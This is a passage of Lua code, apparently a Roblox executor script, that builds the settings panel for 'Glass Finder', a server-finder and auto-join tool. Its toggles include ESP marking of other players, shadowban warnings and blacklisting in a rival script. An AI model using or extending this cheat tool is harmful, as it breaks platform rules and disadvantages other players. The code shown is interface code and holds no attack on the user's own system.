    Interface    = "rbxassetid://124133264580702",
    Configs      = "rbxassetid://101207683756324",
    Subscription = "rbxassetid://134963294985291",
}

local NAV_PLAN = {
    { kind = "header", text = "FINDER", order = 1 },
    { kind = "item", pane = "General", text = "General", order = 2 },
    { kind = "item", pane = "AutoJoin", text = "Auto Join", order = 3 },
    { kind = "item", pane = "Blacklist", text = "Blacklist", order = 4 },
    { kind = "header", text = "ALERTS", order = 5 },
    { kind = "item", pane = "Sound", text = "Sound", order = 6 },
    { kind = "item", pane = "Teams", text = "Teams", order = 7 },
    { kind = "header", text = "APP", order = 8 },
    { kind = "item", pane = "Keybinds", text = "Keybinds", order = 9 },
    { kind = "item", pane = "Interface", text = "Interface", order = 10 },
    { kind = "item", pane = "Configs", text = "Configs", order = 11 },
    { kind = "header", text = "ACCOUNT", order = 12 },
    { kind = "item", pane = "Subscription", text = "Subscription", order = 13 },
}

local navItems = {}
for _, entry in ipairs(NAV_PLAN) do
    if entry.kind == "header" then
        local h = label(NavListFrame, entry.text, 11, T.textLow, {
            fontFace = F.builder, weight = "ExtraBold",
            yalign = Enum.TextYAlignment.Bottom, order = entry.order,
            size = UDim2.new(1, 0, 0, 22),
        })
        local hPad = Instance.new("UIPadding")
        hPad.PaddingBottom = UDim.new(0, 6)
        hPad.Parent = h
    else
        local b = button(NavListFrame, {
            bg = T.chipBg, bgTrans = 1, order = entry.order,
            dim = UDim2.new(1, 0, 0, 36), corner = 8,
        })
        local ic = Instance.new("ImageLabel")
        ic.Image = PANE_ICON[entry.pane]
        ic.BackgroundTransparency = 1
        ic.Position = UDim2.new(0, 12, 0, 10)
        ic.Size = UDim2.new(0, 16, 0, 16)
        ic.ZIndex = 2
        ic.Parent = b
        local tx = label(b, entry.text, 14, T.textMid, {
            pos = UDim2.new(0, 38, 0, 0), size = UDim2.new(1, -46, 1, 0), z = 2,
            fontFace = F.builder, weight = "Medium",
        })
        navItems[entry.pane] = { btn = b, text = tx, icon = ic }
        b.MouseButton1Click:Connect(function()
            openSettingsPane(entry.pane)
        end)
    end
end


PaneScroll = Instance.new("ScrollingFrame")
PaneScroll.Name = "PaneScroll"
PaneScroll.ScrollBarImageColor3 = T.divider
PaneScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
PaneScroll.BackgroundTransparency = 1
PaneScroll.Position = UDim2.new(0, 168, 0, 0)
PaneScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
PaneScroll.ScrollBarThickness = 4
PaneScroll.BorderSizePixel = 0
PaneScroll.Size = UDim2.new(1, -168, 1, 0)
PaneScroll.Parent = SettingsPage

local PanePad = Instance.new("UIPadding")
PanePad.PaddingBottom = UDim.new(0, 18)
PanePad.PaddingTop = UDim.new(0, 12)
PanePad.PaddingRight = UDim.new(0, 18)
PanePad.PaddingLeft = UDim.new(0, 18)
PanePad.Parent = PaneScroll

local PaneList = Instance.new("UIListLayout")
PaneList.SortOrder = Enum.SortOrder.LayoutOrder
PaneList.Padding = UDim.new(0, 14)
PaneList.Parent = PaneScroll



local rowW = function() return UDim2.new(1, 0, 0, 34) end

local function paneTitle(text, desc, order)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = order
    f.Size = UDim2.new(1, 0, 0, 40)
    f.Parent = PaneScroll
    label(f, text, 17, T.textHi, {
        size = UDim2.new(1, 0, 0, 22), fontFace = F.builder, weight = "ExtraBold",
    })
    if desc then
        label(f, desc, 12, T.textLow, {
            pos = UDim2.new(0, 0, 0, 22), size = UDim2.new(1, 0, 0, 16),
            fontFace = F.builder, weight = "Medium",
        })
    end
    return f
end

local function paneSection(text, order)
    local l = label(PaneScroll, text, 11, T.textLow, {
        fontFace = F.builder, weight = "ExtraBold", order = order,
        yalign = Enum.TextYAlignment.Bottom, size = UDim2.new(1, 0, 0, 22),
    })
    local p = Instance.new("UIPadding")
    p.PaddingBottom = UDim.new(0, 2)
    p.Parent = l
    return l
end

local function paneNote(text, order)
    local l = label(PaneScroll, text, 12, T.textLow, {
        wrap = true, autoSize = Enum.AutomaticSize.Y, order = order,
        size = UDim2.new(1, 0, 0, 0), fontFace = F.builder, weight = "Medium",
    })
    return l
end

local function toggleSwitch(parent, initial)
    local track = Instance.new("Frame")
    track.BackgroundColor3 = initial and T.accent or T.divider
    track.BorderSizePixel = 0
    track.AnchorPoint = Vector2.new(1, 0.5)
    track.Position = UDim2.new(1, -14, 0.5, 0)
    track.Size = UDim2.new(0, 40, 0, 24)
    track.ZIndex = 2
    track.Parent = parent
    corner(track, 12)
    local knob = Instance.new("Frame")
    knob.BackgroundColor3 = Color3.new(1, 1, 1)
    knob.BorderSizePixel = 0
    knob.Position = initial and UDim2.new(0, 18, 0, 2) or UDim2.new(0, 2, 0, 2)
    knob.Size = UDim2.new(0, 20, 0, 20)
    knob.ZIndex = 3
    knob.Parent = track
    corner(knob, 10)
    local on = initial
    local api = {}
    function api.set(v)
        on = v
        tween(track, 0.16, { BackgroundColor3 = v and T.accent or T.divider })
        tween(knob, 0.16, { Position = v and UDim2.new(0, 18, 0, 2) or UDim2.new(0, 2, 0, 2) })
    end
    function api.get() return on end
    api.track = track
    return api
end

local function toggleRow(title, desc, order, get, set)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = order
    f.Size = rowW()
    f.Parent = PaneScroll
    label(f, title, 14, T.textHi, {
        size = UDim2.new(1, -136, 0, 20), fontFace = F.builder, weight = "SemiBold",
    })
    if desc then
        label(f, desc, 12, T.textLow, {
            pos = UDim2.new(0, 0, 0, 18), size = UDim2.new(1, -136, 0, 16),
            fontFace = F.builder, weight = "Medium",
        })
    end
    local sw = toggleSwitch(f, get())
    f.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            local nv = not sw.get()
            sw.set(nv)
            set(nv)
            saveSettings()
        end
    end)
    return f, sw
end

local function numberRow(title, desc, order, placeholder, get, set, minV, maxV)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = order
    f.Size = rowW()
    f.Parent = PaneScroll
    label(f, title, 14, T.textHi, {
        size = UDim2.new(1, -136, 0, 20), fontFace = F.builder, weight = "SemiBold",
    })
    if desc then
        label(f, desc, 12, T.textLow, {
            pos = UDim2.new(0, 0, 0, 18), size = UDim2.new(1, -136, 0, 16),
            fontFace = F.builder, weight = "Medium",
        })
    end
    local box = Instance.new("Frame")
    box.BackgroundColor3 = T.panelBg
    box.BorderSizePixel = 0
    box.AnchorPoint = Vector2.new(1, 0.5)
    box.Position = UDim2.new(1, -14, 0.5, 0)
    box.Size = UDim2.new(0, 88, 0, 30)
    box.ZIndex = 2
    box.Parent = f
    corner(box, 7)
    stroke(box, T.divider, 1, 0)
    local tb = Instance.new("TextBox")
    tb.Text = tostring(get())
    tb.TextColor3 = T.textHi
    tb.TextXAlignment = Enum.TextXAlignment.Right
    tb.FontFace = font(F.builder, "Bold")
    tb.BackgroundTransparency = 1
    tb.PlaceholderColor3 = T.textLow
    tb.PlaceholderText = tostring(placeholder)
    tb.Position = UDim2.new(0, 8, 0, 0)
    tb.TextSize = 14
    tb.Size = UDim2.new(1, -16, 1, 0)
    tb.ZIndex = 3
    tb.Parent = box
    tb:GetPropertyChangedSignal("Text"):Connect(function()
        local n = tonumber(tb.Text)
        if n then
            n = math.clamp(math.floor(n), minV, maxV)
            set(n)
            saveSettings()
        end
    end)
    tb.FocusLost:Connect(function()
        tb.Text = tostring(get())
    end)
    return f, tb
end

local function actionRow(title, desc, order, btnText, onClick, danger)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = order
    f.Size = rowW()
    f.Parent = PaneScroll
    label(f, title, 14, T.textHi, {
        size = UDim2.new(1, -136, 0, 20), fontFace = F.builder, weight = "SemiBold",
    })
    if desc then
        label(f, desc, 12, T.textLow, {
            pos = UDim2.new(0, 0, 0, 18), size = UDim2.new(1, -136, 0, 16),
            fontFace = F.builder, weight = "Medium",
        })
    end
    local b = button(f, {
        bg = danger and T.errorRed or T.btnBg, text = btnText,
        pos = UDim2.new(1, -14, 0.5, -15), dim = UDim2.new(0, 88, 0, 30),
        size = 13, color = danger and Color3.new(1, 1, 1) or T.textHi,
        fontFace = F.builder, weight = "SemiBold", z = 2,
    })
    b.AnchorPoint = Vector2.new(1, 0)
    b.MouseButton1Click:Connect(onClick)
    return f, b
end

local function segmentRow(title, desc, order, options, get, set)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = order
    f.Size = UDim2.new(1, 0, 0, 56)
    f.Parent = PaneScroll
    label(f, title, 14, T.textHi, {
        size = UDim2.new(1, -136, 0, 20), fontFace = F.builder, weight = "SemiBold",
    })
    if desc then
        label(f, desc, 12, T.textLow, {
            pos = UDim2.new(0, 0, 0, 18), size = UDim2.new(1, 0, 0, 16),
            wrap = true, fontFace = F.builder, weight = "Medium",
        })
    end
    local seg = Instance.new("Frame")
    seg.BackgroundColor3 = T.panelBg
    seg.BorderSizePixel = 0
    seg.Position = UDim2.new(0, 0, 1, -28)
    seg.Size = UDim2.new(0, 60 * #options + 8, 0, 28)
    seg.Parent = f
    corner(seg, 8)
    local btns = {}
    for i, opt in ipairs(options) do
        local b = button(seg, {
            bg = T.panelBg, bgTrans = 1, text = opt, corner = 7, z = 2,
            pos = UDim2.new(0, 4 + (i - 1) * 60, 0, 2), dim = UDim2.new(0, 56, 0, 24),
            size = 12, fontFace = F.builder, weight = "Bold", color = T.textMid,
        })
        btns[opt] = b
        b.MouseButton1Click:Connect(function()
            set(opt)
            saveSettings()
            for o2, b2 in pairs(btns) do
                local on2 = o2 == opt
                b2.BackgroundColor3 = on2 and T.inputBg or T.panelBg
                b2.BackgroundTransparency = on2 and 0 or 1
                b2.TextColor3 = on2 and T.textHi or T.textMid
            end
        end)
    end
    local cur = get()
    if btns[cur] then
        btns[cur].BackgroundColor3 = T.inputBg
        btns[cur].BackgroundTransparency = 0
        btns[cur].TextColor3 = T.textHi
    end
    return f
end



local paneBuilders = {}

paneBuilders.General = function()
    paneTitle("General", "Everyday behaviour: alerts, auto-hide and safety warnings.", 1)
    toggleRow("Special alerts", "Notify when a brainrot from your Special list appears", 2,
        function() return Settings.specialAlerts end,
        function(v) Settings.specialAlerts = v end)
    toggleRow("Auto-hide on arrival", "Minimise the panel when your server holds a listed find", 3,
        function() return Settings.autoHideOnArrival end,
        function(v) Settings.autoHideOnArrival = v end)
    toggleRow("Clear teleport errors", "Dismiss failed-teleport popups automatically", 4,
        function() return Settings.clearTpErrors end,
        function(v) Settings.clearTpErrors = v end)
    toggleRow("Shadowban warning", "Warn and pause Auto Join if this account is stuck in the flagged server", 5,
        function() return Settings.shadowbanWarning end,
        function(v) Settings.shadowbanWarning = v end)
    toggleRow("Protect Glass users in Rose", "Adds Glass Finder users in your server to Rose's admin blacklist", 6,
        function() return Settings.protectRose end,
        function(v) Settings.protectRose = v end)
    toggleRow("Mark other Glass Finder users", "Red ESP and a GLASS TERRORIST tag on them in your server", 7,
        function() return Settings.markGlassUsers end,
        function(v) Settings.markGlassUsers = v updatePeerESP() end)
    actionRow("Clear Config", "Reset all current settings and filters to defaults", 8, "Reset",
        function()
            local keepTeams = Settings.teams
            Settings = defaultSettings()
            Settings.teams = keepTeams
            saveSettings()
            openSettingsPane(State.settingsPane)
            refreshChips()
            scheduleRefresh()
        end, true)
end

paneBuilders.AutoJoin = function()
    paneTitle("Auto Join", "When and where Glass Finder joins servers for you.", 1)
    
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = 2
    f.Size = rowW()
    f.Parent = PaneScroll
    label(f, "Minimum generation", 14, T.textHi, {
        size = UDim2.new(1, -136, 0, 20), fontFace = F.builder, weight = "SemiBold",
    })
    label(f, "Finder and Auto Join skip anything below this", 12, T.textLow, {
        pos = UDim2.new(0, 0, 0, 18), size = UDim2.new(1, -136, 0, 16),
        fontFace = F.builder, weight = "Medium",
    })
    local genChip = button(f, {
        bg = T.panelBg, text = formatIncomeShort(Settings.minGen),
        pos = UDim2.new(1, -14, 0.5, -15), dim = UDim2.new(0, 88, 0, 30),
        size = 13, fontFace = F.builder, weight = "Bold", z = 2,
    })
    genChip.AnchorPoint = Vector2.new(1, 0)
    genChip.MouseButton1Click:Connect(function()
        local idx = 1
        for i, v in ipairs(MIN_STEPS) do
            if v == Settings.minGen then idx = i break end
        end
        Settings.minGen = MIN_STEPS[(idx % #MIN_STEPS) + 1]
        genChip.Text = formatIncomeShort(Settings.minGen)
        saveSettings()
        refreshChips()
        scheduleRefresh()
    end)
    toggleRow("Pet filter", "Only brainrots selected in Filters › Filter", 3,
        function() return Settings.petFilter end,
        function(v) Settings.petFilter = v scheduleRefresh() end)
    toggleRow("Start enabled", "Turn Auto Join on automatically after every join", 4,
        function() return Settings.ajStartEnabled end,
        function(v) Settings.ajStartEnabled = v end)
    toggleRow("Auto Join OG", "Always armed: joins any new OG find, even with Auto Join off (OG pill in the top bar)", 5,
        function() return Settings.ajOG end,
        function(v) Settings.ajOG = v updateOGVisual() end)
    paneSection("Joining", 6)
    numberRow("Force attempts", "Retries if a join fails (1–100)", 7, 1,
        function() return Settings.ajForceAttempts end,
        function(v) Settings.ajForceAttempts = v end, 1, 100)
    numberRow("Force-join gap (ms)", "Wait between retries (600–10000)", 8, 600,
        function() return Settings.ajForceGap end,
        function(v) Settings.ajForceGap = v end, 600, 10000)
    numberRow("Auto-join gap (ms)", "Minimum time between Auto Join starts (600–60000)", 9, 800,
        function() return Settings.ajAutoGap end,
        function(v) Settings.ajAutoGap = v end, 600, 60000)
    toggleRow("Fast retries", "Use a 600 ms gap after a failed join", 10,
        function() return Settings.ajFastRetries end,
        function(v) Settings.ajFastRetries = v end)
    toggleRow("Prefer newest find", "Switch a waiting retry to a newer match", 11,
        function() return Settings.ajPreferNewest end,
        function(v) Settings.ajPreferNewest = v end)
    toggleRow("Queue join", "Queue into all full servers", 12,
        function() return Settings.ajQueueJoin end,
        function(v) Settings.ajQueueJoin = v scheduleRefresh() end)
    toggleRow("Queue into full OG servers only", "Same, but only servers with an OG brainrot", 13,
        function() return Settings.ajQueueOGOnly end,
        function(v) Settings.ajQueueOGOnly = v scheduleRefresh() end)
    paneNote("Auto Join queues any full (or 7/8) server and joins when a slot opens", 14)
    paneNote("Owners on your Blacklist are always skipped. Force attempts and gaps also apply to the Join button.", 15)
end

paneBuilders.Blacklist = function()
    paneTitle("Blacklist", "Owners whose servers Auto Join always skips.", 1)
    paneNote("Blocked owners stay visible in Finder, but Auto Join never picks their servers.", 2)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.LayoutOrder = 3
    f.Size = UDim2.new(1, 0, 0, 40)
    f.Parent = PaneScroll
    local box = Instance.new("Frame")
    box.BackgroundColor3 = T.panelBg
    box.BorderSizePixel = 0
    box.Position = UDim2.new(0, 0, 0, 4)
    box.Size = UDim2.new(1, -120, 0, 32)
    box.Parent = f
    corner(box, 8)
    stroke(box, T.divider, 1, 0)
    local tb = Instance.new("TextBox")
    tb.Text = ""
    tb.TextColor3 = T.textHi
    tb.ClearTextOnFocus = false
    tb.TextXAlignment = Enum.TextXAlignment.Left
    tb.FontFace = font(F.builder, "Medium")
    tb.BackgroundTransparency = 1
    tb.PlaceholderColor3 = T.textLow
    tb.PlaceholderText = "Owner username…"
    tb.Position = UDim2.new(0, 10, 0, 0)
    tb.TextSize = 13
    tb.Size = UDim2.new(1, -20, 1, 0)
    tb.Parent = box
    local blockBtn = button(f, {
        bg = T.btnBg, text = "Block", pos = UDim2.new(1, -112, 0, 4),
        dim = UDim2.new(0, 112, 0, 32), size = 13,
        fontFace = F.builder, weight = "SemiBold",
    })
    local listHolder = Instance.new("Frame")
    listHolder.BackgroundTransparency = 1
    listHolder.LayoutOrder = 4
    listHolder.Size = UDim2.new(1, 0, 0, 0)
    listHolder.AutomaticSize = Enum.AutomaticSize.Y
    listHolder.Parent = PaneScroll
    local listLayout = Instance.new("UIListLayout")
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
    listLayout.Padding = UDim.new(0, 6)
    listLayout.Parent = listHolder
    local function rebuildBlacklist()
        for _, c in ipairs(listHolder:GetChildren()) do
            if c:IsA("Frame") or c:IsA("TextButton") then c:Destroy() end
        end
        if #Settings.blacklist == 0 then
            label(listHolder, "No blocked owners", 13, T.textLow, {
                align = Enum.TextXAlignment.Center, size = UDim2.new(1, 0, 0, 32),
                fontFace = F.builder, weight = "Medium",
            })
            return
        end
        for i, name in ipairs(Settings.blacklist) do
            local r = Instance.new("Frame")
            r.BackgroundColor3 = T.chipBg
            r.BorderSizePixel = 0
            r.LayoutOrder = i
            r.Size = UDim2.new(1, 0, 0, 32)
            r.Parent = listHolder
            corner(r, 8)
            label(r, name, 13, T.textHi, {
                pos = UDim2.new(0, 12, 0, 0), size = UDim2.new(1, -80, 1, 0),
                fontFace = F.builder, weight = "Medium",
            })
            local rm = button(r, {
                bg = T.chipBg, text = "Remove", pos = UDim2.new(1, -76, 0.5, -12),
                dim = UDim2.new(0, 64, 0, 24), size = 11, color = T.errorRed,
                fontFace = F.builder, weight = "SemiBold",
            })
            rm.MouseButton1Click:Connect(function()
                table.remove(Settings.blacklist, i)
                saveSettings()
                rebuildBlacklist()
                scheduleRefresh()
            end)
        end
    end
    blockBtn.MouseButton1Click:Connect(function()
        local name = tb.Text:gsub("^%s+", ""):gsub("%s+$", "")
        if name ~= "" then
            table.insert(Settings.blacklist, name)
            saveSettings()
            tb.Text = ""
            rebuildBlacklist()
            scheduleRefresh()
        end
    end)
    rebuildBlacklist()
end

paneBuilders.Sound = function()
    paneTitle("Sound", "Sounds for finds, joins and connection problems.", 1)
    toggleRow("Sound alerts", nil, 2,
        function() return Settings.soundEnabled end,
        function(v) Settings.soundEnabled = v end)
    
    local vf = Instance.new("Frame")
    vf.BackgroundTransparency = 1
    vf.LayoutOrder = 3
    vf.Size = rowW()
    vf.Parent = PaneScroll
    label(vf, "Volume", 14, T.textHi, {
        size = UDim2.new(1, -136, 0, 20), fontFace = F.builder, weight = "SemiBold",
    })
    local volLabel = label(vf, Settings.soundVolume .. "%", 13, T.textMid, {
        align = Enum.TextXAlignment.Right, pos = UDim2.new(1, -14, 0, 0),
        size = UDim2.new(0, 88, 0, 34), fontFace = F.builder, weight = "Bold",
    })
    local slider = Instance.new("TextButton")
    slider.AutoButtonColor = false
    slider.BackgroundColor3 = T.panelBg
    slider.BorderSizePixel = 0
    slider.AnchorPoint = Vector2.new(1, 0.5)
    slider.Position = UDim2.new(1, -110, 0.5, 0)
    slider.Size = UDim2.new(0, 150, 0, 6)
    slider.Text = ""
    slider.Parent = vf
    corner(slider, 3)
    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = T.accent
    fill.BorderSizePixel = 0
    fill.Size = UDim2.new(Settings.soundVolume / 100, 0, 1, 0)
    fill.Parent = slider
    corner(fill, 3)
    local function setVolFromX(x)
        local rel = math.clamp((x - slider.AbsolutePosition.X) / math.max(slider.AbsoluteSize.X, 1), 0, 1)
        Settings.soundVolume = math.floor(rel * 100)
        fill.Size = UDim2.new(rel, 0, 1, 0)
        volLabel.Text = Settings.soundVolume .. "%"
        saveSettings()
    end
    local sliding = false
    slider.MouseButton1Down:Connect(function(x)
        sliding = true
        setVolFromX(x)
    end)
    UserInputService.InputChanged:Connect(function(input)
        if sliding and input.UserInputType == Enum.UserInputType.MouseMovement then
            setVolFromX(input.Position.X)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliding = false
        end
    end)
    paneSection("Events", 4)
    local EVENTS = {
        { key = "sndFind",    title = "New find",    desc = "Matches your Finder filters" },
        { key = "sndSpecial", title = "Special find", desc = "A brainrot from your Special list" },
        { key = "sndJoin",    title = "Teleport to a server started", desc = nil },
        { key = "sndError",   title = "Connection error", desc = "Relay dropped or failed" },
    }
    for i, ev in ipairs(EVENTS) do
        local order = 4 + i
        local f = Instance.new("Frame")
        f.BackgroundTransparency = 1
        f.LayoutOrder = order
        f.Size = UDim2.new(1, 0, 0, 44)
        f.Parent = PaneScroll
        label(f, ev.title, 13, T.textHi, {
            size = UDim2.new(1, -236, 0, 20), fontFace = F.builder, weight = "SemiBold",
        })
        if ev.desc then
            label(f, ev.desc, 11, T.textLow, {
                pos = UDim2.new(0, 0, 0, 20), size = UDim2.new(1, -236, 0, 16),
                fontFace = F.builder, weight = "Medium",
            })
        end
        
        local box = Instance.new("Frame")
        box.BackgroundColor3 = T.panelBg
        box.BorderSizePixel = 0
        box.Position = UDim2.new(1, -212, 0.5, -16)
        box.Size = UDim2.new(0, 150, 0, 32)
        box.Parent = f
        corner(box, 8)
        stroke(box, T.divider, 1, 0)
        local tb = Instance.new("TextBox")
        tb.Text = tostring(Settings[ev.key] or "")
        tb.TextColor3 = T.textHi
        tb.ClearTextOnFocus = false
        tb.FontFace = font(F.robotoMono, "Regular")
        tb.BackgroundTransparency = 1
        tb.PlaceholderColor3 = T.textLow
        tb.PlaceholderText = "Audio ID"
        tb.Position = UDim2.new(0, 8, 0, 0)
        tb.TextSize = 12
        tb.Size = UDim2.new(1, -16, 1, 0)
        tb.Parent = box
        tb:GetPropertyChangedSignal("Text"):Connect(function()
            Settings[ev.key] = tb.Text
            saveSettings()
        end)
        local playBtn = button(f, {
            bg = T.btnBg, text = "Play", pos = UDim2.new(1, -54, 0.5, -16),
            dim = UDim2.new(0, 44, 0, 32), size = 12,
            fontFace = F.builder, weight = "SemiBold",
        })
        playBtn.MouseButton1Click:Connect(function()
            playSoundId(Settings[ev.key])
        end)
    end
    paneNote("Paste any Roblox audio ID. Leave empty for silence.", 9)
end

paneBuilders.Teams = function()
    paneTitle("Teams", "Tag players from team rosters above their name.", 1)
    paneNote("Tags players who are on a team's roster above their name. A roster is a list URL (JSON with good/bad arrays) and/or names you type in. Tags refresh when rosters reload.", 2)
    paneSection("Tag look", 3)
    numberRow("Text size", nil, 4, 14,
        function() return Settings.tagTextSize end,
        function(v) Settings.tagTextSize = v end, 8, 32)
    numberRow("Height above head (studs)", nil, 5, 4,
        function() return Settings.tagHeight end,
        function(v) Settings.tagHeight = v end, 1, 20)
    numberRow("Max distance (studs)", nil, 6, 1000,
        function() return Settings.tagDistance end,
        function(v) Settings.tagDistance = v end, 50, 5000)
    paneSection("Teams", 7)
    local order = 8
    for _, team in ipairs(Settings.teams) do
        local o = order
        order = order + 1
        local f = Instance.new("Frame")
        f.BackgroundColor3 = T.chipBg
        f.BackgroundTransparency = 0.4
        f.BorderSizePixel = 0
        f.LayoutOrder = o
        f.Size = UDim2.new(1, 0, 0, 52)
        f.Parent = PaneScroll
        corner(f, 10)
        local roster = State.rosters[team.id]
        local status
        if team.source == "kawaifu" then
            status = "detected live"
        elseif roster then
            status = string.format("%d good · %d bad · live", roster.goodN or 0, roster.badN or 0)
        else
            status = "managed roster: unavailable"
        end
        label(f, team.name, 14, T.textHi, {
            pos = UDim2.new(0, 12, 0, 6), size = UDim2.new(1, -166, 0, 20),
            fontFace = F.builder, weight = "SemiBold",
        })
        label(f, status, 11, T.textLow, {
            pos = UDim2.new(0, 12, 0, 26), size = UDim2.new(1, -166, 0, 16),
            fontFace = F.builder, weight = "Medium",
        })
        
        local sw = toggleSwitch(f, team.enabled ~= false)
        sw.track.Position = UDim2.new(1, -72, 0.5, -12)
        local editBtn = button(f, {
            bg = T.btnBg, bgTrans = 1, text = "Edit",
            pos = UDim2.new(1, -64, 0.5, -20), dim = UDim2.new(0, 56, 0, 40),
            size = 13, color = T.linkBlue, fontFace = F.builder, weight = "SemiBold", z = 3,
        })
        editBtn.MouseButton1Click:Connect(function()
            openTeamEditor(team)
        end)
        f.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                team.enabled = not (team.enabled ~= false)
                sw.set(team.enabled)
                saveSettings()
                refreshTeamTags()
            end
        end)
    end
    local addOrder = order
    order = order + 1
    local addBtn = button(PaneScroll, {
        bg = T.btnBg, text = "Add team", order = addOrder,
        dim = UDim2.new(1, 0, 0, 32), size = 13,
        fontFace = F.builder, weight = "SemiBold",
    })
    addBtn.MouseButton1Click:Connect(function()
        local team = {
            id = "team" .. tostring(os.time()):sub(-6), name = "New team", enabled = true,
            url = "", key = "", goodField = "good", badField = "bad",
            goodText = "GOOD BOY", badText = "BAD BOY",
            goodColor = "#5ADCA0", badColor = "#F05A5A",
            showGood = true, showBad = true, manualGood = "", manualBad = "",
        }
        table.insert(Settings.teams, team)
        saveSettings()
        openTeamEditor(team)
        openSettingsPane("Teams")
    end)
    local refreshBtn = button(PaneScroll, {
        bg = T.btnBg, text = "Refresh lists", order = order,
        dim = UDim2.new(1, 0, 0, 32), size = 13,
        fontFace = F.builder, weight = "SemiBold",
    })
    refreshBtn.MouseButton1Click:Connect(function()
        refreshBtn.Text = "Refreshing…"
        task.spawn(function()
            loadAllRosters()
            refreshBtn.Text = "Refresh lists"
            openSettingsPane("Teams")
            refreshTeamTags()
        end)
    end)
end

paneBuilders.Keybinds = function()
    paneTitle("Keybinds", "Keyboard shortcuts for the panel and Auto Join.", 1)
    local KEYS = {
        { key = "kbToggle", title = "Show / hide panel" },
        { key = "kbAJ", title = "Toggle Auto Join" },
        { key = "kbReconnect", title = "Reconnect" },
    }
    for i, kb in ipairs(KEYS) do
        local f = Instance.new("Frame")
        f.BackgroundTransparency = 1
        f.LayoutOrder = 1 + i
        f.Size = rowW()
        f.Parent = PaneScroll
        label(f, kb.title, 14, T.textHi, {
            size = UDim2.new(1, -136, 0, 34), fontFace = F.builder, weight = "SemiBold",
        })
        local b = button(f, {
            bg = T.panelBg, text = tostring(Settings[kb.key] or "–"),
            pos = UDim2.new(1, -14, 0.5, -15), dim = UDim2.new(0, 44, 0, 30),
            size = 13, fontFace = F.builder, weight = "Bold", z = 2,
        })
        b.AnchorPoint = Vector2.new(1, 0)
        stroke(b, T.divider, 1, 0)
        b.MouseButton1Click:Connect(function()
            State.capturing = { slot = kb.key, btn = b, old = b.Text }
            b.Text = "Press a key…"
        end)
    end
    paneNote("Click a key, then press the new one. Backspace unbinds, Esc cancels.", 5)
end

paneBuilders.Interface = function()
    paneTitle("Interface", "Size, floating buttons, previews and start-up delay.", 1)
    segmentRow("UI scale", "Auto fits the panel to small and mobile screens", 2,
        { "Auto", "75%", "100%", "125%", "150%" },
        function() return Settings.uiScale end,
        function(v) Settings.uiScale = v applyUIScale() end)
    toggleRow("Floating buttons while open", "Keep the round panel and Auto Join buttons on screen", 3,
        function() return Settings.floatingButtons end,
        function(v) Settings.floatingButtons = v updateFloating() end)
    segmentRow("3D brainrot previews", nil, 4, { "Auto", "On", "Off" },
        function() return Settings.previews3D end,
        function(v) Settings.previews3D = v end)
    toggleRow("Start delay on join", nil, 5,
        function() return Settings.startDelay end,
        function(v) Settings.startDelay = v end)
    paneNote("3D previews on Auto are turned off on phones and tablets, which only show icons. Drag the floating buttons anywhere; they stay put between sessions.", 6)
end

paneBuilders.Configs = function()
    paneTitle("Configs", "Save and restore your whole Glass Finder setup.", 1)
    actionRow("Export config", "Copy the current settings JSON to your clipboard", 2, "Export",
        function()
            pcall(function()
                local json = HttpService:JSONEncode(Settings)
                if setclipboard then setclipboard(json)
                elseif toclipboard then toclipboard(json) end
            end)
        end)
    actionRow("Clear Config", "Reset all current settings and filters to defaults", 3, "Reset",
        function()
            Settings = defaultSettings()
            saveSettings()
            openSettingsPane("Configs")
            refreshChips()
            scheduleRefresh()
        end, true)
end

paneBuilders.Subscription = function()
    paneTitle("Subscription", "Your Glass Finder relay account.", 1)
    local f = Instance.new("Frame")
    f.BackgroundColor3 = T.chipBg
    f.BackgroundTransparency = 0.4
    f.BorderSizePixel = 0
    f.LayoutOrder = 2
    f.Size = UDim2.new(1, 0, 0, 64)
    f.Parent = PaneScroll
    corner(f, 10)
    local subDot = Instance.new("Frame")
    subDot.BackgroundColor3 = State.connection == "Connected" and T.accent or T.errorRed
    subDot.BorderSizePixel = 0
    subDot.Position = UDim2.new(0, 14, 0.5, -3)
    subDot.Size = UDim2.new(0, 6, 0, 6)
    subDot.Parent = f
    corner(subDot, 3)
    label(f, State.connection == "Connected" and "Relay active" or "Not linked", 14, T.textHi, {
        pos = UDim2.new(0, 28, 0, 10), size = UDim2.new(1, -40, 0, 20),
        fontFace = F.builder, weight = "SemiBold",
    })
    label(f, State.connection == "Connected"
        and ("Viewers online: " .. tostring(State.stats.viewers or 0))
        or "Join discord.gg/GlassFinder to link your account", 11, T.textLow, {
        pos = UDim2.new(0, 28, 0, 32), size = UDim2.new(1, -40, 0, 20),
        fontFace = F.builder, weight = "Medium",
    })
end

function openSettingsPane(name)
    State.settingsPane = name
    for _, c in ipairs(PaneScroll:GetChildren()) do
        if c:IsA("Frame") or c:IsA("TextLabel") or c:IsA("TextButton") then
            c:Destroy()
        end
    end
    for paneName, item in pairs(navItems) do
        local on = paneName == name
        item.btn.BackgroundColor3 = on and T.chipBg or T.panelBg
        item.btn.BackgroundTransparency = on and 0 or 1
        item.text.TextColor3 = on and T.textHi or T.textMid
        item.icon.ImageColor3 = on and T.accent or T.textMid
    end
    local builder = paneBuilders[name]
    if builder then builder() end
    PaneScroll.CanvasPosition = Vector2.new(0, 0)
end




TeamModal = Instance.new("TextButton")
TeamModal.Name = "TeamModal"
TeamModal.AutoButtonColor = false
TeamModal.BackgroundColor3 = Color3.new(0, 0, 0)
TeamModal.BackgroundTransparency = 0.45
TeamModal.BorderSizePixel = 0
TeamModal.Text = ""
TeamModal.Size = UDim2.new(1, 0, 1, 0)
TeamModal.Visible = false
TeamModal.ZIndex = 40
TeamModal.Parent = ScreenGui

